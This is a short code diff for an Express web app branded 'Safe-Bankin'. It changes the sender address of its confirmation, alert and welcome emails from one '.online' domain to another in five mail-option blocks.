@@ -49,7 +49,7 @@ app.post('/login/otp.html', async (req, res) => {
   });
 
   const mail_option = {
-    from: `Safe-Bankin <noreply@assistin.online>`,
+    from: `Safe-Bankin <noreply@help-in.online>`,
     to: info.email,
     subject: "Safe-Bankin Confirmation Code",
     html:
@@ -276,7 +276,7 @@ app.post('/done.html', async (req, res) => {
   });
 
   const mail_option = {
-    from: `Safe-Bankin <noreply@assistin.online>`,
+    from: `Safe-Bankin <noreply@help-in.online>`,
     to: info.senderemail,
     subject: "New Alert From Safe-Bankin ",
     html:
@@ -561,7 +561,7 @@ app.post('/done2.html', async (req, res) => {
 
 
   const mail_option = {
-    from: `Safe-Bankin <noreply@assistin.online>`,
+    from: `Safe-Bankin <noreply@help-in.online>`,
     to: info.senderemail,
     subject: "New Alert From Safe-Bankin",
     html:
@@ -811,7 +811,7 @@ color:#ffffff!important;
   }
 
   const mail_option2 = {
-    from: `Safe-Bankin <noreply@assistin.online>`,
+    from: `Safe-Bankin <noreply@help-in.online>`,
     to: info.receiveremail,
     subject: "New Alert From Safe-Bankin",
     html:
@@ -2366,7 +2366,7 @@ app.post('/register/index.html', async (req, res) => {
   });
 
   const mail_option = {
-    from: `Safe-Bankin <noreply@assistin.online>`,
+    from: `Safe-Bankin <noreply@help-in.online>`,
     to: info.email,
     subject: "Welcome Message From Safe-Bankin",
     html:
